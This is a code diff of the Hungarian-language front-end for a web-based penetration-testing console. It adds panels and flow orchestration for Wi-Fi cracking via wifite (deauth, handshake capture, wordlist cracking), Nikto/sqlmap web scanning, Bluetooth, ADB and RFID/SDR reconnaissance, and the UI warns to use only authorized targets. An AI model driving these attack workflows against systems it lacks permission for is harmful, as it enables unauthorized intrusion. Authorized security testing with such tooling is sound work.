   {id:'log',label:'Napló',glyph:'list'},{id:'note',label:'Jegyzet',glyph:'note'}];
 /* KÖZÖS panelek; a tartalom a modulhoz igazodik, a gomb halvány/inaktív, ha nincs hozzá tartalom */
 function railAvail(id){
-  if(id==='flow')return !!FLOW[curView];
-  if(id==='ctx')return ['nmap','wifite','vedelem','update'].includes(curView);
-  if(id==='ext')return ['nmap','wifite','pentest','vedelem','update','bt','android','radio'].includes(curView);
+  if(id==='flow')return !!FLOWSCOPE[curView]||!!FLOW[curView];
+  if(id==='ctx')return ['nmap','wifite','vedelem','update','bt','android','webapp','radio'].includes(curView);
+  if(id==='ext')return ['nmap','wifite','pentest','vedelem','update','bt','android','radio','webapp'].includes(curView);
   if(id==='desc')return !!DESC[curView];
   if(id==='export')return !!TERMID[curView];
   if(id==='hist')return !!CMDID[curView];
@@ -615,6 +949,11 @@ const DESC={
   kb:['Tudásbázis.','<p>Jogi háttér, módszertan, Nmap és wireless mélymerülés, gyakorló platformok. A dokumentumok a /docs mappából töltődnek.</p>'],
   update:['Frissítés.','<p>A Kali pentest-eszközök (konténer) vagy a host rendszer frissítése. A verziók előbb lekérhetők.</p>'],
   settings:['Megjelenés és eszköz.','<p>Téma, méret, sűrűség, görgetés, panelek, nyelv — mind a program saját beállítása, a böngészőtől függetlenül.</p>'],
+  bt:['Bluetooth / BLE felderítés.','<p>Közeli Bluetooth/BLE eszközök keresése a bluetoothctl-lel. Belső vagy USB BT-adapter kell (Linux); a tool a jobb oldali <b>Bővítmények</b> panelen telepíthető. A talált eszközök (MAC, név) a modulban és az <b>Eredmény</b> panelen. Csak saját vagy engedélyezett eszközön!</p>'],
+  android:['Android / mobil vizsgálat ADB-n át.','<p>Eszköz-infó (getprop), telepített csomagok és logcat ADB-vel. A telefonon kapcsold be az USB-hibakeresést, csatlakoztasd, majd „Eszközök". Az <code>adb</code> a <b>Bővítmények</b> panelen telepíthető. Csak saját vagy engedélyezett eszköz.</p>'],
+  webapp:['Webalkalmazás-vizsgálat.','<p>WhatWeb (ujjlenyomat), Nikto (sérülékenység-szken) és sqlmap (SQLi) a cél URL ellen. Válassz eszközt, írd a célt a parancssorba, Futtat. A talált sebezhetőségek a <b>Találatok</b> modulban gyűlnek. Csak írásosan engedélyezett célpont!</p>'],
+  radio:['RFID-NFC és SDR felderítés.','<p>NFC/RFID olvasás (libnfc) és SDR 433 MHz figyelés (rtl_433). Megfelelő hardver kell: NFC-olvasó (PN532/ACR122) vagy RTL-SDR dongle; a tool a <b>Bővítmények</b> panelen telepíthető. Csak saját vagy engedélyezett jel/eszköz!</p>'],
+  monitor:['Élő figyelők.','<p>Folyamatos, élő monitorok: hálózat/rendszer (folyamatok, kapcsolatok, portok, userek, auth-napló, tcpdump, fájlváltozás), Bluetooth (HCI, BT-log) és Android (logcat, akku, hálózat). Több figyelő is futhat egyszerre, minden sor <b>[TAG]</b>-gel jelzi a forrását. A hardver-/root-függők a uConsole-on élnek.</p>'],
 };
 const FLOW={
   wifite:{cur:1,steps:[{k:'s',l:'Monitor mód'},{l:'Hálózatok keresése',d:'wifite -i wlan1',who:'Eszköz'},{k:'d',l:'Célpont?',no:'Keresés leállítása (Ctrl+C), majd szám'},{l:'Handshake / PMKID',d:'deauth + capture',who:'Eszköz'},{l:'Jelszótörés',d:'wordlist',who:'Eszköz'},{k:'e',l:'Eredmény'}]},
@@ -662,9 +1001,23 @@ const DRAWER={
       return `<div style="padding:10px 12px 0"><h4 style="margin:0;font-size:14px">Frissítés — verziók</h4><div class="muted" style="margin-bottom:6px">${UPDVER?'lekérve':'kattints a „Verziók" gombra a Bővítmények panelen'}</div></div>
         <div class="scan-cat" style="padding:6px 12px 2px">Pentest-eszközök (Kali)</div>${pre(u.container)}
         <div class="scan-cat" style="padding:8px 12px 2px">Host rendszer</div>${pre(u.host)}`;}
+    if(v==='bt'){const ds=BTLAST;
+      return `<div style="padding:10px 12px 0"><h4 style="margin:0;font-size:14px">Bluetooth — eredmény</h4><div class="muted" style="margin-bottom:6px">utolsó szken találatai</div></div>
+        <div class="term-tiles" style="margin:0 10px;border:1px solid var(--line)"><div class="ttile"><div class="tv">${ds.length}</div><div class="tk">eszköz</div></div></div>
+        <div class="scan-cat" style="padding:6px 12px 2px">Talált eszközök</div><div style="padding:0 6px">${ds.length?ds.map(x=>`<div class="hsitem">${L('b')}<span class="hn" title="${esc(x.mac)}">${esc(x.name||'(névtelen)')}</span><span class="muted">${esc(x.mac)}</span></div>`).join(''):'<div class="dempty">Még nincs szken. Indíts keresést a modulban.</div>'}</div>`;}
+    if(v==='android'){const ds=AND.devices||[];
+      return `<div style="padding:10px 12px 0"><h4 style="margin:0;font-size:14px">Android — eszközök</h4></div>
+        <div class="term-tiles" style="margin:0 10px;border:1px solid var(--line)"><div class="ttile"><div class="tv">${ds.length}</div><div class="tk">eszköz</div></div></div>
+        <div class="scan-cat" style="padding:6px 12px 2px">Csatlakoztatott</div><div style="padding:0 6px">${ds.length?ds.map(x=>`<div class="hsitem">${L(x.state==='device'?'g':'y')}<span class="hn">${esc(x.model||x.serial)}</span><span class="muted">${esc(x.serial)} · ${esc(x.state)}</span></div>`).join(''):'<div class="dempty">Nincs eszköz. USB + hibakeresés, majd „Eszközök".</div>'}</div>${AND.serial?`<p class="muted" style="font-size:11px;padding:6px 12px">Kiválasztva: ${esc(AND.serial)}</p>`:''}`;}
+    if(v==='webapp'){const w=WALAST;
+      return `<div style="padding:10px 12px 0"><h4 style="margin:0;font-size:14px">Webapp — eredmény</h4></div>
+        ${w?`<div class="desc" style="padding:6px 12px"><div class="defcard"><div class="defhead"><span class="dn">${esc(w.tool)}</span><span class="dtag">${w.lines||0} sor</span></div><div class="defdesc mono" style="display:block">cél: ${esc(w.target)}</div></div><p class="muted" style="font-size:11px">A teljes kimenet a modul termináljában. A talált sebezhetőségek a <button class="lnk" data-go="findings">Találatok</button> modulban gyűlnek.</p></div>`:'<div class="dempty" style="margin:10px">Még nincs futtatás. Válassz eszközt, add meg a célt, Futtat.</div>'}`;}
+    if(v==='radio'){const r=RADLAST;
+      return `<div style="padding:10px 12px 0"><h4 style="margin:0;font-size:14px">RFID / SDR — eredmény</h4></div>
+        ${r?`<div class="desc" style="padding:6px 12px"><div class="defcard"><div class="defhead"><span class="dn">${esc(r.kind==='nfc'?'NFC / RFID':'SDR 433 MHz')}</span><span class="dtag">${r.lines||0} sor</span></div><div class="defdesc mono" style="display:block">utolsó futtatás</div></div><p class="muted" style="font-size:11px">A kimenet a modul termináljában.</p></div>`:'<div class="dempty" style="margin:10px">Még nincs futtatás. Válassz NFC vagy SDR műveletet.</div>'}`;}
     return DRAWER.desc();},
   desc(){const d=DESC[curView]||['Rövid leírás.','<p>Ehhez a modulhoz a leírás később készül el.</p>'];return `<div class="desc"><h4>${TITLE[curView]}</h4><div class="lead">${d[0]}</div>${d[1]}</div>`;},
-  flow(){const f=FLOW[curView]||FLOW._;return `<div class="desc"><h4>${TITLE[curView]} — folyamat</h4>${f.steps.map((s,i)=>{const st=i<f.cur?'done':i===f.cur?'now':'todo';
+  flow(){if(FLOWSCOPE[curView])return ptFlowHtml();const f=FLOW[curView]||FLOW._;return `<div class="desc"><h4>${TITLE[curView]} — folyamat</h4>${f.steps.map((s,i)=>{const st=i<f.cur?'done':i===f.cur?'now':'todo';
     if(s.k==='s'||s.k==='e')return `<div style="text-align:center;margin:6px 0"><span class="hb ${st==='todo'?'':'done'}" style="padding:2px 12px;border-radius:12px">${s.l}</span></div>`;
     if(s.k==='d')return `<div class="note warn" style="margin:6px 0"><span class="ni">?</span><div><b>${s.l}</b><br><span class="muted">nem → ${esc(s.no)}</span></div></div>`;
     return `<div class="defcard" style="margin:5px 0"><div class="defhead"><span class="dn">${i}. ${esc(s.l)}</span><span class="dtag ${st==='now'?'crit':''}">${st==='now'?'most · ':''}${esc(s.who)}</span></div><div class="defdesc" style="border:0">${esc(s.d)}</div></div>`;}).join('')}</div>`;},
@@ -748,9 +1101,27 @@ const ACT={
   async radioScan(b){const kind=b.dataset.k;const t=RAD.tools.find(x=>x.key===kind);if(t&&!t.installed)toast('Ehhez hardver/tool kell','warning');renderLine({raw:'$ '+kind+' felderítés…',type:'action'},'radioOut');try{const d=await fetch('/api/radio/scan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({kind})}).then(r=>r.json());if(d&&d.error){toast(d.error,'error');renderLine({raw:'[!] '+d.error,type:'error'},'radioOut');}}catch(e){toast('Hálózati hiba','error');}},
   radioStop(){fetch('/api/radio/stop',{method:'POST'}).catch(()=>{});},
   radioClear(){termClear('radioOut');},
+  monToggle(b){const k=b.dataset.k;if(MON.running[k])monStopOne(k);else monStartOne(k);},
+  monStopAll(){Object.keys(MON.running).slice().forEach(monStopOne);},
+  monClear(){termClear('monOut');},
   modToolsRefresh(){modStatusLoad().then(()=>{if(curTool==='ext')renderDrawer();});},
+  ptfSel(b){PTFSEL=b.dataset.k;const n=ptNode(PTFSEL);if(n)PTFVIA=(ptOut(n.lib)[0]||'target');renderDrawer();},
+  ptfBranch(b){PTFSEL=b.dataset.k;PTFVIA=b.dataset.o;renderDrawer();},
+  ptfRootMode(){PTFSEL=null;PTFVIA='target';renderDrawer();},
+  ptfAdd(b){ptfAddNode(+b.dataset.k);},
+  ptfDel(b){const id=b.dataset.k,rm=new Set();const collect=i=>{rm.add(i);ptChildren(i).forEach(c=>collect(c.id));};collect(id);PTFLOW.nodes=PTFLOW.nodes.filter(n=>!rm.has(n.id));if(rm.has(PTFSEL)){PTFSEL=null;PTFVIA='target';}ptSave();renderDrawer();},
+  ptfNew(){if(ORCH&&ORCH.running){toast('Előbb állítsd le a futó folyamatot','warning');return;}if(PTFLOW.nodes.length&&!confirm('Új üres folyamat? A jelenlegi (nem mentett) elvész.'))return;PTFLOW={version:2,target:PTFLOW.target||'',nodes:[]};PTFSEL=null;PTFVIA='target';ORCH=null;ptSave();renderDrawer();},
+  ptfSaveAs(){const nm=(PTFNAME||'').trim();if(!nm){toast('Adj nevet a folyamatnak','warning');return;}PTSAVED[nm]=JSON.parse(JSON.stringify(PTFLOW));PTSAVED[nm]._scope=flowScope();store.set('ptflows',PTSAVED);toast('Mentve: '+nm,'info');renderDrawer();},
+  ptfOpen(b){const nm=b.dataset.k;if(PTSAVED[nm]){PTFLOW=JSON.parse(JSON.stringify(PTSAVED[nm]));PTFSEL=null;PTFVIA='target';ORCH=null;ptSave();renderDrawer();toast('Megnyitva: '+nm,'info');}},
+  ptfDelSaved(b){const nm=b.dataset.k;delete PTSAVED[nm];store.set('ptflows',PTSAVED);renderDrawer();},
+  ptfTpl(b){const t=PTTPL[+b.dataset.k];if(!t)return;if(PTFLOW.nodes.length&&!confirm('Betöltöd a(z) „'+t.n+'" sablont? A jelenlegi (nem mentett) folyamat elvész.'))return;PTFLOW={version:2,target:PTFLOW.target||'',nodes:JSON.parse(JSON.stringify(t.nodes))};PTFSEL=null;PTFVIA='target';ORCH=null;ptSave();renderDrawer();toast('Sablon betöltve: '+t.n,'info');},
+  ptfRun(){ptfRunStart();},
+  ptfStop(){if(ORCH){ORCH.stop=true;ORCH.paused=false;}fetch('/api/pentest/kill',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({terminalId:1})}).catch(()=>{});renderLine({raw:'[*] ⏹ Leállítás kérve.',type:'action'},'ptOut');if(ORCH&&!ORCH.awaiting)orchFinish('leállítva');renderDrawer();},
+  ptfPause(){if(ORCH&&ORCH.running){ORCH.paused=!ORCH.paused;toast(ORCH.paused?'Szünet':'Folytatás','info');if(!ORCH.paused&&!ORCH.awaiting)orchStep();renderDrawer();}},
+  ptfStep(){if(!ORCH||!ORCH.running){ptfRunStart();return;}if(ORCH.awaiting){toast('Egy lépés épp fut','info');return;}ORCH._step1=true;ORCH.paused=false;orchStep();},
+  ptfInstallTool(b){const key=b.dataset.k;renderLine({raw:'$ telepítés: '+key,type:'action'},'ptOut');toast('Telepítés indul: '+key,'info');fetch('/api/pentest/tool/install',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key,terminalId:1})}).then(r=>r.json()).then(r=>{if(r&&r.error)toast(r.message||r.error,'error');}).catch(()=>toast('Hálózati hiba','error'));},
   async modInstall(b){const key=b.dataset.k;b.disabled=true;const o=$('#modInstallOut');if(o){o.innerHTML='';}renderLine({raw:'[*] Telepítés indul: '+key+' …',type:'action'},'modInstallOut');toast('Telepítés indul (konténerbe)…','info');try{const d=await fetch('/api/module/install',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({module:key})}).then(r=>r.json());if(d&&d.error){toast(d.message||d.error,'error');renderLine({raw:'[!] '+(d.message||d.error),type:'error'},'modInstallOut');b.disabled=false;}}catch(e){toast('Hálózati hiba','error');b.disabled=false;}},
-  async btScan(b){const l=$('#btList');const dur=($('#btDur')&&$('#btDur').value)||8;if(l)l.innerHTML='<div class="dempty">Keresés… (~'+dur+' mp, ne zárd be)</div>';if(b)b.disabled=true;try{const d=await fetch('/api/bt/scan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({seconds:+dur})}).then(r=>r.json());if(d.error){l.innerHTML='<div class="dempty">'+esc(d.message||'Nem elérhető.')+'</div>';}else{const ds=d.devices||[];l.innerHTML=ds.length?ds.map(x=>`<div class="hsitem">${L('b')}<span class="hn" title="${esc(x.mac)}">${esc(x.name||'(névtelen)')}</span><span class="muted">${esc(x.mac)}</span></div>`).join(''):'<div class="dempty">Nem találtam eszközt a közelben.</div>';applog('b','BT keresés: '+ds.length+' eszköz');}}catch(e){l.innerHTML='<div class="dempty">Hálózati hiba.</div>';}if(b)b.disabled=false;},
+  async btScan(b){const l=$('#btList');const dur=($('#btDur')&&$('#btDur').value)||8;if(l)l.innerHTML='<div class="dempty">Keresés… (~'+dur+' mp, ne zárd be)</div>';if(b)b.disabled=true;try{const d=await fetch('/api/bt/scan',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({seconds:+dur})}).then(r=>r.json());if(d.error){l.innerHTML='<div class="dempty">'+esc(d.message||'Nem elérhető.')+'</div>';}else{const ds=d.devices||[];BTLAST=ds;if(curTool==='ctx')renderDrawer();l.innerHTML=ds.length?ds.map(x=>`<div class="hsitem">${L('b')}<span class="hn" title="${esc(x.mac)}">${esc(x.name||'(névtelen)')}</span><span class="muted">${esc(x.mac)}</span></div>`).join(''):'<div class="dempty">Nem találtam eszközt a közelben.</div>';applog('b','BT keresés: '+ds.length+' eszköz');}}catch(e){l.innerHTML='<div class="dempty">Hálózati hiba.</div>';}if(b)b.disabled=false;},
   wifiteNaplo(){const s=STATE.wifite;const sum=`Összesítés: ${s.networks} hálózat, ${s.handshakes} handshake/PMKID, ${s.cracked} feltört.`;saveToNaplo('wifi','WiFi audit — '+tDate(Date.now()),sum+'\n\n'+termText('wifiteOut'));},
   /* védelem */
   extSel(b){const k=b.dataset.k;EXTSEL=(EXTSEL===k)?null:k;renderDrawer();if(curView==='vedelem'){const tb=$('#vedTbar');if(tb)tb.outerHTML=vedTbarHtml();if(EXTSEL){const d=DEFENSES.find(x=>x.name===EXTSEL);if(d&&d.key)setTimeout(()=>defRefreshOne(d.key),30);}}},
@@ -823,6 +1194,12 @@ const INP={
   tkCk:i=>{const t=(TASKS[curView]||[]).find(x=>x.id===i.dataset.k);if(t){t.done=i.checked;store.set('tasks',TASKS);renderDrawer();badges();}},
   ntText:i=>{NOTES[curView]=i.value;store.set('notes',NOTES);},
   set:i=>{SET[i.dataset.k](i.value);say('Beállítás: '+i.dataset.k);},
+  ptfTarget:i=>{PTFLOW.target=i.value.trim();ptSave();},
+  ptfName:i=>{PTFNAME=i.value;},
+  ptfSearch:i=>{PTFSEARCH=i.value;const p=$('.ptpalette');if(p)p.innerHTML=ptPaletteHtml();},
+  ptfFilter:i=>{PTFFILTER=i.checked;const p=$('.ptpalette');if(p)p.innerHTML=ptPaletteHtml();},
+  ptfStopErr:i=>{PTSTOPERR=i.checked;},
+  ptfConsent:i=>{PTCONSENT=i.checked;},
 };
 
 /* ═══════════════ PARANCSOK / MENÜ / ESEMÉNYEK ═══════════════ */
@@ -909,20 +1286,20 @@ try{socket=io();
   socket.on('disconnect',()=>{connBadge(false);applog('r','Megszakadt a kapcsolat');});
   socket.on('connect_error',()=>connBadge(false));
   /* webapp */
-  socket.on('webapp:start',({tool,target})=>{termClear('webappOut');say('Webapp: '+tool+' → '+target,'b');timerStart('webappOut');});
-  socket.on('webapp:output',d=>renderLine(d,'webappOut'));
+  socket.on('webapp:start',({tool,target})=>{WALAST={tool,target,lines:0};termClear('webappOut');say('Webapp: '+tool+' → '+target,'b');timerStart('webappOut');if(curTool==='ctx')renderDrawer();});
+  socket.on('webapp:output',d=>{if(WALAST)WALAST.lines++;renderLine(d,'webappOut');});
   socket.on('webapp:error',d=>{renderLine({raw:'[!] '+(d.message||'hiba'),type:'error'},'webappOut');say('Webapp hiba','r');timerStop('webappOut');});
-  socket.on('webapp:done',({code,stopped})=>{timerStop('webappOut');say(stopped?'Webapp leállítva':(code===0?'Webapp kész':'Webapp vége ('+code+')'),stopped?'y':(code===0?'g':'y'));});
+  socket.on('webapp:done',({code,stopped})=>{timerStop('webappOut');say(stopped?'Webapp leállítva':(code===0?'Webapp kész':'Webapp vége ('+code+')'),stopped?'y':(code===0?'g':'y'));if(curTool==='ctx')renderDrawer();});
   /* android */
   socket.on('android:start',({action,serial})=>{termClear('androidOut');say('Android: '+action+' ('+serial+')','b');timerStart('androidOut');});
   socket.on('android:output',d=>renderLine(d,'androidOut'));
   socket.on('android:error',d=>{renderLine({raw:'[!] '+(d.message||'hiba'),type:'error'},'androidOut');say('Android hiba','r');timerStop('androidOut');});
   socket.on('android:done',({code,stopped})=>{timerStop('androidOut');say(stopped?'Android leállítva':(code===0?'Android kész':'Android vége ('+code+')'),stopped?'y':(code===0?'g':'y'));});
   /* radio (rfid/sdr) */
-  socket.on('radio:start',({kind})=>{termClear('radioOut');say('RFID/SDR: '+kind+' indul','b');timerStart('radioOut');});
-  socket.on('radio:output',d=>renderLine(d,'radioOut'));
+  socket.on('radio:start',({kind})=>{RADLAST={kind,lines:0};termClear('radioOut');say('RFID/SDR: '+kind+' indul','b');timerStart('radioOut');if(curTool==='ctx')renderDrawer();});
+  socket.on('radio:output',d=>{if(RADLAST)RADLAST.lines++;renderLine(d,'radioOut');});
   socket.on('radio:error',d=>{renderLine({raw:'[!] '+(d.message||'hiba'),type:'error'},'radioOut');say('RFID/SDR hiba','r');timerStop('radioOut');});
-  socket.on('radio:done',({code,stopped})=>{timerStop('radioOut');say(stopped?'Leállítva':(code===0?'Kész':'Vége ('+code+')'),stopped?'y':(code===0?'g':'y'));});
+  socket.on('radio:done',({code,stopped})=>{timerStop('radioOut');say(stopped?'Leállítva':(code===0?'Kész':'Vége ('+code+')'),stopped?'y':(code===0?'g':'y'));if(curTool==='ctx')renderDrawer();});
   /* modul-tool telepítő */
   socket.on('module:start',({module})=>{say('Telepítés: '+module,'b');});
   socket.on('module:output',({line})=>renderLine({raw:line,type:'out'},'modInstallOut'));
@@ -958,8 +1335,8 @@ try{socket=io();
   socket.on('defense:output',data=>renderLine(data,'vedOut'));
   socket.on('defense:done',({key})=>{defSetBusy(false);renderLine({raw:'[kész]',type:'action'},'vedOut');if(key)setTimeout(()=>defRefreshOne(key),700);say('Védelmi művelet kész');});
   /* pentest */
-  socket.on('pentest:output',({terminalId,data,isError})=>{renderLine({raw:(data||'').replace(/\n$/,''),type:isError?'error':'info'},PT_TERM[terminalId]||'ptOut');});
-  socket.on('pentest:done',({terminalId,exitCode})=>{const t=PT_TERM[terminalId]||'ptOut';timerStop(t);renderLine({raw:'[kész] kód: '+(exitCode==null?'?':exitCode),type:exitCode===0?'success':'warning'},t);if(terminalId===2)DEFENSES.forEach(d=>{if(d.key)defRefreshOne(d.key);});});
+  socket.on('pentest:output',({terminalId,data,isError})=>{if(ORCH&&ORCH.awaiting&&terminalId===1)ORCH.buf+=(data||'').replace(/\n+$/,'')+'\n';const mon=MONTAG[terminalId];renderLine({raw:(mon?'['+mon+'] ':'')+(data||'').replace(/\n$/,''),type:isError?'error':'info'},mon?'monOut':(PT_TERM[terminalId]||'ptOut'));});
+  socket.on('pentest:done',({terminalId,exitCode})=>{const mon=MONTAG[terminalId];if(mon){renderLine({raw:'['+mon+'] [figyelő vége]',type:'warning'},'monOut');const key=Object.keys(MON.running).find(k=>MON.running[k].tid===terminalId);if(key){delete MON.running[key];monBtn(key);}delete MONTAG[terminalId];return;}const t=PT_TERM[terminalId]||'ptOut';timerStop(t);if(!(ORCH&&ORCH.awaiting&&terminalId===1))renderLine({raw:'[kész] kód: '+(exitCode==null?'?':exitCode),type:exitCode===0?'success':'warning'},t);if(terminalId===2)DEFENSES.forEach(d=>{if(d.key)defRefreshOne(d.key);});if(ORCH&&ORCH.awaiting&&terminalId===1)orchOnDone(exitCode);});
   socket.on('pentest:tooldone',({code})=>{PT.installing=null;setTimeout(ptToolsFetch,400);say(code===0?'Eszköz telepítve':'Telepítés hiba',code===0?'g':'y');});
   /* update */
   socket.on('update:output',d=>renderLine({raw:d.line||'',type:'out'},'updOut'));
